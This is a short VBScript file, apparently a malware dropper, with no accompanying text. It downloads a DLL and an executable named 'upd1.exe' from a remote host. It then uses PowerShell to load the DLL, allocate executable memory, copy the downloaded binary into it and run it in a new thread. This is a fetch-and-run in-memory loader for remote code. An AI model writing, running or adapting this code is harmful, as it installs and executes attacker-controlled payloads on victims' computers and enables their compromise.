Set fso  = CreateObject("Scripting.FileSystemObject")
Set http = CreateObject("MSXML2.XMLHTTP")
folder = fso.GetParentFolderName(WScript.ScriptFullName)
path = folder & "\kd3.dll"
http.Open "GET", "https://automacoes-remote-control.sgploq.easypanel.host/kd3.dll", False
http.Send
Set st = CreateObject("ADODB.Stream")
st.Type = 1
st.Open
st.Write http.ResponseBody
st.SaveToFile path, 2
st.Close
Set sh = CreateObject("WScript.Shell")
cmd = "powershell -NoExit -Command ""$w=[Reflection.Assembly]::LoadFile('" & folder & "\kd3.dll');$b=(New-Object Net.WebClient).DownloadData('https://automacoes-remote-control.sgploq.easypanel.host/upd1.exe');Write-Host ('LEN=' + $b.Length);$m=[K.Win]::VirtualAlloc(0,[uint32]$b.Length,12288,64);Write-Host ('MEM=' + $m);$t=[IntPtr]::Zero;[K.Win]::Relocate($b,$m);[Runtime.InteropServices.Marshal]::Copy($b,0,$m,$b.Length);[void][K.Win]::CreateThread(0,0,$m,0,0,[ref]$t);if($t -ne 0){Start-Sleep -Seconds 5;$ec=[uint32]::Zero;[void][K.Win]::GetExitCodeThread($t,[ref]$ec);Write-Host ('THREAD=' + $ec.ToString('X8'))}"""
sh.Run cmd, 1, False
